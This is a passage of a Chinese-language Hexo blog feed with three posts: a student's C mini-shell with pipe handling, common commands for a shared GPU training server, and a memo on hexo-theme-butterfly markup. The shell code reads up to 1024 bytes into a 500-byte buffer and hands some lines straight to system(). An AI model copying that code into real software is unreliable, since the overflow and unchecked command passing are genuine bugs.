class="string">&quot;No input received&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="built_in">strcpy</span>(command, parameters[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最終成果如下，將pipe補上，但要注意的是不可以做多重檔案重定向。</p><p>另外將程式碼改成c，雖然改動範圍不大就是了，希望對大家有幫助。</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * author Afan Chen. </span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *args[<span class="number">512</span>];</span><br><span class="line"><span class="type">pid_t</span> pid;</span><br><span class="line"><span class="type">int</span> command_pipe[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> READ 0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> WRITE 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execute</span><span class="params">(<span class="type">char</span> *cmd, <span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">WaitChild</span><span class="params">(<span class="type">int</span> n)</span>;</span><br><span class="line"><span class="type">char</span> line[<span class="number">500</span>];</span><br><span class="line"><span class="type">int</span> n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">type_prompt</span><span class="params">()</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">read_command</span><span class="params">(<span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hello!\nThis is Afan@Shell\nctrl-c or ctrl-\\ to quit\n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">&#123;</span><br><span class="line">type_prompt();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!fgets(line, <span class="number">1024</span>, <span class="built_in">stdin</span>))</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">   </span><br><span class="line"><span class="type">int</span> input = <span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> first = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *cmd = line;</span><br><span class="line"><span class="type">char</span> *next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;|&#x27;</span>); <span class="comment">/* 找第一個 &#x27;|&#x27; */</span></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *file = <span class="string">&quot;&lt;&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">strpbrk</span>(cmd, file) != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">system(cmd);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">*next = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">input = execute(cmd, input, first, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">cmd = next + <span class="number">1</span>;</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;|&#x27;</span>); <span class="comment">/* 找其他的 &#x27;|&#x27; */</span></span><br><span class="line">first = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">input = execute(cmd, input, first, <span class="number">1</span>);</span><br><span class="line">WaitChild(n);</span><br><span class="line">n = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">type_prompt</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Afan@Shell:$ &quot;</span>);</span><br><span class="line">  fflush(<span class="literal">NULL</span>);<span class="comment">//清空緩衝區，把字串print出來</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">read_command</span><span class="params">(<span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> pipettes[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">pipe(pipettes);</span><br><span class="line">pid = fork();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (first == <span class="number">1</span> &amp;&amp; last == <span class="number">0</span> &amp;&amp; input == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dup2(pipettes[WRITE], STDOUT_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (first == <span class="number">0</span> &amp;&amp; last == <span class="number">0</span> &amp;&amp; input != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">dup2(input, STDIN_FILENO);</span><br><span class="line">dup2(pipettes[WRITE], STDOUT_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">dup2(input, STDIN_FILENO);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (execvp(args[<span class="number">0</span>], args) == <span class="number">-1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OOOOOOOh!It&#x27;s wrong.\n&quot;</span>);</span><br><span class="line">_exit(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (input != <span class="number">0</span>)</span><br><span class="line">close(input);</span><br><span class="line"></span><br><span class="line">close(pipettes[WRITE]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (last == <span class="number">1</span>)</span><br><span class="line">close(pipettes[READ]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> pipettes[READ];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WaitChild</span><span class="params">(<span class="type">int</span> n)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">wait(<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* <span class="title function_">SkipWhite</span><span class="params">(<span class="type">char</span> *s)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">isspace</span>(*s))</span><br><span class="line">s++;</span><br><span class="line"><span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">Split</span><span class="params">(<span class="type">char</span> *cmd)</span></span><br><span class="line">&#123;</span><br><span class="line">cmd = SkipWhite(cmd);</span><br><span class="line"><span class="type">char</span> *next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line"><span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (next != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">next[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">args[i] = cmd;</span><br><span class="line">i++;</span><br><span class="line">cmd = SkipWhite(next + <span class="number">1</span>);</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (cmd[<span class="number">0</span>] != <span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">args[i] = cmd;</span><br><span class="line">next = <span class="built_in">strchr</span>(cmd, <span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">next[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">i++;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">args[i] = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">execute</span><span class="params">(<span class="type">char</span> *cmd, <span class="type">int</span> input, <span class="type">int</span> first, <span class="type">int</span> last)</span></span><br><span class="line">&#123;</span><br><span class="line">Split(cmd);</span><br><span class="line"><span class="keyword">if</span> (args[<span class="number">0</span>] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">n += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> read_command(input, first, last);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 作業系統 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>gpu server 架好之後的一些常用指令</title>
      <link href="/gpu-server-command/"/>
      <url>/gpu-server-command/</url>
      
        <content type="html"><![CDATA[<p>之前參加AI Cup的時候跟資工系的蘇木春教授借了一台GPU server來給組員遠端做使用，這是當時撰寫的一些簡單規範，從hackMD拿過來這邊放當備份。</p><h2 id="運行你的程式前請先做以下事項"><a class="markdownIt-Anchor" href="#運行你的程式前請先做以下事項"></a> !運行你的程式前，請先做以下事項</h2><p>查詢有沒有人在用gpu，使用率很高的話，請在跑的時候指定沒人用的gpu</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nvidia-smi</span><br></pre></td></tr></table></figure><h2 id="一些會常用的指令"><a class="markdownIt-Anchor" href="#一些會常用的指令"></a> 一些會常用的指令</h2><h3 id="下載python"><a class="markdownIt-Anchor" href="#下載python"></a> 下載python</h3><p>工作站裡面沒有python3.8，只有到3.6，所以需要自己下載，步驟如下，一次請只輸入一條指令。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt update</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install software-properties-common</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes/ppa</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install python3.8</span><br></pre></td></tr></table></figure><p>成功安裝的話運行這個，理論上會出現Python 3.8.12</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3.8 --version</span><br></pre></td></tr></table></figure><h3 id="傳送檔案"><a class="markdownIt-Anchor" href="#傳送檔案"></a> 傳送檔案</h3><p>要傳送檔案到工作站的話，ssh下可以使用以下指令，之後輸入一下密碼就好了</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 要傳送的檔案 user@140.115.0.0:~/data(目的地)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -P 22 -r 要傳送的檔案目錄 user2@140.115.0.0:~/data(目的地)</span><br></pre></td></tr></table></figure><h3 id="安裝虛擬環境"><a class="markdownIt-Anchor" href="#安裝虛擬環境"></a> 安裝虛擬環境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install virtualenv</span><br><span class="line">python3.8 -m virtualenv venv --python=python3.8</span><br></pre></td></tr></table></figure><h3 id="開啟虛擬環境"><a class="markdownIt-Anchor" href="#開啟虛擬環境"></a> 開啟虛擬環境</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">source ./venv/bin/activate</span><br></pre></td></tr></table></figure><h3 id="跑模型"><a class="markdownIt-Anchor" href="#跑模型"></a> 跑模型</h3><p>在yolov5底下開啟venv虛擬環境之後，輸入以下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nohup python3.8 -m torch.distributed.launch --nproc_per_node 2 train.py --img 1280 --batch 16 --epochs 200 --data train.yaml --weights yolov5s.pt --device 0,1</span><br></pre></td></tr></table></figure><h3 id="離開ssh時讓模型繼續跑"><a class="markdownIt-Anchor" href="#離開ssh時讓模型繼續跑"></a> 離開ssh時讓模型繼續跑</h3><p>進入一個程序管理器</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tmux</span><br></pre></td></tr></table></figure><p>接下來執行完跑模型的操作之後依序按下ctrl+b和d，就可以退出當前程式，並讓程式在背景運行</p><h3 id="下載模型"><a class="markdownIt-Anchor" href="#下載模型"></a> 下載模型</h3><p>訓練完的模型從伺服器裡面下載回來做使用。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">scp -r -P 22 user@140.115.0.0:~/project/yolov5/runs/train/exp2 G:\project</span><br></pre></td></tr></table></figure><h3 id="下載解壓縮套件"><a class="markdownIt-Anchor" href="#下載解壓縮套件"></a> 下載解壓縮套件</h3><p>因為圖片太多了，基本上都是壓縮成一個檔案上傳，但伺服器端沒有解壓縮的套件</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo apt install zip</span><br></pre></td></tr></table></figure><p>之後就可以使用</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">unzip 檔案名稱</span><br></pre></td></tr></table></figure><p>來解壓縮到當前路徑</p><h3 id="建立資料夾"><a class="markdownIt-Anchor" href="#建立資料夾"></a> 建立資料夾</h3><p>如果要在本地和遠端都建立一個專案來跑的話，請先在遠端home/user?之下先建立檔案路徑，可以使用以下指令</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkdir 資料夾名稱</span><br></pre></td></tr></table></figure><h3 id="跑文本識別"><a class="markdownIt-Anchor" href="#跑文本識別"></a> 跑文本識別</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 -m paddle.distributed.launch --gpus &#x27;0,1&#x27;  tools/train.py -c configs/rec/rec_icdar15_train.yml</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 機器學習 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>hexo-theme-butterfly 常用語法</title>
      <link href="/set-hexo-theme/"/>
      <url>/set-hexo-theme/</url>
      
        <content type="html"><![CDATA[<p>給自己的一個備忘錄，一般的markdown語法就不提了。</p><p>主要想記錄我自己未來應該會用到的語法，之後寫作用。</p><p>轉載自https://butterfly.js.org/posts/dc584b87</p><h3 id="page-front-matter"><a class="markdownIt-Anchor" href="#page-front-matter"></a> Page Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">type:</span><br><span class="line">comments:</span><br><span class="line">description:</span><br><span class="line">keywords:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aside:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>寫法解釋<br />title【必需】頁面標題<br />date【必需】頁面創建日期<br />type【必需】標籤、分類和友情鏈接三個頁面需要配置<br />updated【可選】頁面更新日期<br />description【可選】頁面描述<br />keywords【可選】頁面關鍵字<br />comments【可選】顯示頁面評論模塊(默認 true)<br />top_img【可選】頁面頂部圖片<br />mathjax【可選】顯示mathjax(當設置mathjax的per_page: false時，才需要配置，默認 false)<br />katex【可選】顯示katex(當設置katex的per_page: false時，才需要配置，默認 false)<br />aside【可選】顯示側邊欄 (默認 true)<br />aplayer【可選】在需要的頁面加載aplayer的js和css,請參考文章下面的音樂 配置<br />highlight_shrink【可選】配置代碼框是否展開(true/false)(默認為設置中highlight_shrink的配置)</p><h3 id="post-front-matter"><a class="markdownIt-Anchor" href="#post-front-matter"></a> Post Front-matter</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title:</span><br><span class="line">date:</span><br><span class="line">updated:</span><br><span class="line">tags:</span><br><span class="line">categories:</span><br><span class="line">keywords:</span><br><span class="line">description:</span><br><span class="line">top<span class="emphasis">_img:</span></span><br><span class="line"><span class="emphasis">comments:</span></span><br><span class="line"><span class="emphasis">cover:</span></span><br><span class="line"><span class="emphasis">toc:</span></span><br><span class="line"><span class="emphasis">toc_</span>number:</span><br><span class="line">toc<span class="emphasis">_style_</span>simple:</span><br><span class="line">copyright:</span><br><span class="line">copyright<span class="emphasis">_author:</span></span><br><span class="line"><span class="emphasis">copyright_</span>author<span class="emphasis">_href:</span></span><br><span class="line"><span class="emphasis">copyright_</span>url:</span><br><span class="line">copyright<span class="emphasis">_info:</span></span><br><span class="line"><span class="emphasis">mathjax:</span></span><br><span class="line"><span class="emphasis">katex:</span></span><br><span class="line"><span class="emphasis">aplayer:</span></span><br><span class="line"><span class="emphasis">highlight_</span>shrink:</span><br><span class="line"><span class="section">aside:</span></span><br><span class="line"><span class="section">---</span></span><br></pre></td></tr></table></figure><p>寫法解釋<br />title【必需】文章標題<br />date【必需】文章創建日期<br />updated【可選】文章更新日期<br />tags【可選】文章標籤<br />categories【可選】文章分類<br />keywords【可選】文章關鍵字<br />description【可選】文章描述<br />top_img【可選】文章頂部圖片<br />cover【可選】文章縮略圖(如果沒有設置top_img,文章頁頂部將顯示縮略圖，可設為false/圖片地址/留空)<br />comments【可選】顯示文章評論模塊(默認 true)<br />toc【可選】顯示文章TOC(默認為設置中toc的enable配置)<br />toc_number【可選】顯示toc_number(默認為設置中toc的number配置)<br />toc_style_simple【可選】顯示 toc 簡潔模式<br />copyright【可選】顯示文章版權模塊(默認為設置中post_copyright的enable配置)<br />copyright_author【可選】文章版權模塊的文章作者<br />copyright_author_href【可選】文章版權模塊的文章作者鏈接<br />copyright_url【可選】文章版權模塊的文章連結鏈接<br />copyright_info【可選】文章版權模塊的版權聲明文字<br />mathjax【可選】顯示mathjax(當設置mathjax的per_page: false時，才需要配置，默認 false)<br />katex【可選】顯示katex(當設置katex的per_page: false時，才需要配置，默認 false)<br />aplayer【可選】在需要的頁面加載aplayer的js和css,請參考文章下面的音樂 配置<br />highlight_shrink【可選】配置代碼框是否展開(true/false)(默認為設置中highlight_shrink的配置)<br />aside【可選】顯示側邊欄 (默認 true)</p><h3 id="gallery-相冊"><a class="markdownIt-Anchor" href="#gallery-相冊"></a> Gallery 相冊</h3><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">&#123;% gallery %&#125;</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg</span>)</span><br><span class="line">![](<span class="link">https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg</span>)</span><br><span class="line">&#123;% endgallery %&#125;</span><br></pre></td></tr></table></figure><div class="fj-gallery"><p><img src="https://i.loli.net/2019/12/25/Fze9jchtnyJXMHN.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/ryLVePaqkYm4TEK.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/gEy5Zc1Ai6VuO4N.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/d6QHbytlSYO4FBG.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/6nepIJ1xTgufatZ.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/E7Jvr4eIPwUNmzq.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/mh19anwBSWIkGlH.jpg" alt="" /><br /><img src="https://i.loli.net/2019/12/25/2tu9JC8ewpBFagv.jpg" alt="" /></p>          </div><h3 id="圖表繪製"><a class="markdownIt-Anchor" href="#圖表繪製"></a> 圖表繪製</h3><p>使用mermaid標籤可以繪製Flowchart（流程圖）、Sequence diagram（時序圖 ）、Class Diagram（類別圖）、State Diagram（狀態圖）、Gantt（甘特圖）和Pie Chart（圓形圖），具體可以查看<a href="https://mermaid-js.github.io/mermaid/#/">mermaid文檔</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% mermaid %&#125;</span><br><span class="line">pie</span><br><span class="line">    title Key elements in Product X</span><br><span class="line">    &quot;Calcium&quot; : 42.96</span><br><span class="line">    &quot;Potassium&quot; : 50.05</span><br><span class="line">    &quot;Magnesium&quot; : 10.01</span><br><span class="line">    &quot;Iron&quot; :  5</span><br><span class="line">&#123;% endmermaid %&#125;</span><br></pre></td></tr></table></figure><div class="mermaid-wrap"><pre class="mermaid-src" hidden>  pie    title Key elements in Product X    &quot;Calcium&quot; : 42.96    &quot;Potassium&quot; : 50.05    &quot;Magnesium&quot; : 10.01    &quot;Iron&quot; :  5  </pre></div><h3 id="tabs"><a class="markdownIt-Anchor" href="#tabs"></a> Tabs</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs Unique name, [index] %&#125;</span><br><span class="line">&lt;!-- tab [Tab caption] [@icon] --&gt;</span><br><span class="line">Any content (support inline tags too).</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br><span class="line"></span><br><span class="line">Unique name   : Unique name of tabs block tag without comma.</span><br><span class="line">                Will be used in #id&#x27;s as prefix for each tab with their index numbers.</span><br><span class="line">                If there are whitespaces in name, for generate #id all whitespaces will replaced by dashes.</span><br><span class="line">                Only for current url of post/page must be unique!</span><br><span class="line">[index]       : Index number of active tab.</span><br><span class="line">                If not specified, first tab (1) will be selected.</span><br><span class="line">                If index is -1, no tab will be selected. It&#x27;s will be something like spoiler.</span><br><span class="line">                Optional parameter.</span><br><span class="line">[Tab caption] : Caption of current tab.</span><br><span class="line">                If not caption specified, unique name with tab index suffix will be used as caption of tab.</span><br><span class="line">                If not caption specified, but specified icon, caption will empty.</span><br><span class="line">                Optional parameter.</span><br><span class="line">[@icon]       : FontAwesome icon name (full-name, look like &#x27;fas fa-font&#x27;)</span><br><span class="line">                Can be specified with or without space; e.g. &#x27;Tab caption @icon&#x27; similar to &#x27;Tab caption@icon&#x27;.</span><br><span class="line">                Optional parameter.</span><br></pre></td></tr></table></figure><p>實際使用大概像是這樣</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test1 %&#125;</span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 1.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 2.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab --&gt;</span><br><span class="line">**This is Tab 3.**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test1"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test1-1">test1 1</button></li><li class="tab"><button type="button" data-href="#test1-2">test1 2</button></li><li class="tab"><button type="button" data-href="#test1-3">test1 3</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test1-1"><p><strong>This is Tab 1.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-2"><p><strong>This is Tab 2.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test1-3"><p><strong>This is Tab 3.</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% tabs test4 %&#125;</span><br><span class="line">&lt;!-- tab 第一個Tab --&gt;</span><br><span class="line">**tab名字為第一個Tab**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab @fab fa-apple-pay --&gt;</span><br><span class="line">**只有圖標 沒有Tab名字**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- tab 炸彈@fas fa-bomb --&gt;</span><br><span class="line">**名字+icon**</span><br><span class="line">&lt;!-- endtab --&gt;</span><br><span class="line">&#123;% endtabs %&#125;</span><br></pre></td></tr></table></figure><div class="tabs" id="test4"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#test4-1">第一個Tab</button></li><li class="tab"><button type="button" data-href="#test4-2"><i class="fab fa-apple-pay" style="text-align: center;"></i></button></li><li class="tab"><button type="button" data-href="#test4-3"><i class="fas fa-bomb"></i>炸彈</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="test4-1"><p><strong>tab名字為第一個Tab</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-2"><p><strong>只有圖標 沒有Tab名字</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="test4-3"><p><strong>名字+icon</strong></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><h3 id="內嵌圖片"><a class="markdownIt-Anchor" href="#內嵌圖片"></a> 內嵌圖片</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% inlineImg [src] [height] %&#125;</span><br><span class="line"></span><br><span class="line">[src]      :    圖片鏈接</span><br><span class="line">[height]   ：   圖片高度限制【可選】</span><br></pre></td></tr></table></figure><h3 id="highlight"><a class="markdownIt-Anchor" href="#highlight"></a> highlight</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% label text color %&#125;</span><br></pre></td></tr></table></figure><p>參數解釋<br />text文字<br />color【可選】背景顏色，默認為 default(default/blue/pink/red/purple/orange/green)</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">臣亮言：&#123;% label 先帝 %&#125;創業未半，而&#123;% label 中道崩殂 blue %&#125;。今天下三分，&#123;% label 益州疲敝 pink %&#125;，此誠&#123;% label 危急存亡之秋 red %&#125;也！然侍衞之臣，不懈於內；&#123;% label 忠志之士 purple %&#125;，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。</span><br><span class="line">宮中、府中，俱為一體；陟罰臧否，不宜異同。若有&#123;% label 作奸 orange %&#125;、&#123;% label 犯科 green %&#125;，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。</span><br></pre></td></tr></table></figure><p>臣亮言：<mark class="hl-label default">先帝</mark> 創業未半，而<mark class="hl-label blue">中道崩殂</mark> 。今天下三分，<mark class="hl-label pink">益州疲敝</mark> ，此誠<mark class="hl-label red">危急存亡之秋</mark> 也！然侍衞之臣，不懈於內；<mark class="hl-label purple">忠志之士</mark> ，忘身於外者，蓋追先帝之殊遇，欲報之於陛下也。誠宜開張聖聽，以光先帝遺德，恢弘志士之氣；不宜妄自菲薄，引喻失義，以塞忠諫之路也。<br />宮中、府中，俱為一體；陟罰臧否，不宜異同。若有<mark class="hl-label orange">作奸</mark> 、<mark class="hl-label green">犯科</mark> ，及為忠善者，宜付有司，論其刑賞，以昭陛下平明之治；不宜偏私，使內外異法也。</p><h3 id="timeline"><a class="markdownIt-Anchor" href="#timeline"></a> timeline</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% timeline title,color %&#125;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&lt;!-- timeline title --&gt;</span><br><span class="line">xxxxx</span><br><span class="line">&lt;!-- endtimeline --&gt;</span><br><span class="line">&#123;% endtimeline %&#125;</span><br></pre></td></tr></table></figure><p>參數解釋<br />title標題/時間線<br />colortimeline 顏色(default(留空) / blue / pink / red / purple / orange 